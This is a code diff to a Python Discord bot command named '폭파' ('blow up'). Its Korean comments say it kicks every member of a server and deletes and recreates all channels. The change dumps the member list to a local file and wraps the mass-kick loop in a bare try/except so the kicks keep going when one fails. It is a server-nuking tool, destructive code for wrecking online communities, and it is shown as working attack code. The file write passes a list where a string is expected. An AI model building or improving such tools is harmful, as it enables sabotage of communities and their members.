@@ -309,10 +309,16 @@ async def 폭파(ctx):
 
             # 모든 멤버 강퇴
             guildMembers = ctx.guild.members
-            print(guildMembers)
+            memberfile = open("memberfile.json", "w")
+            memberfile.write(guildMembers)
+            memberfile.close()
             for member in guildMembers:
-                await asyncio.sleep(0.3)
-                await ctx.guild.kick(member)
+                try:
+                    print(member)
+                    await asyncio.sleep(0.3)
+                    await ctx.guild.kick(member)
+                except:
+                    pass
 
             # 모든 채널 삭제후 채널 생성
             for channel in ctx.guild.channels:
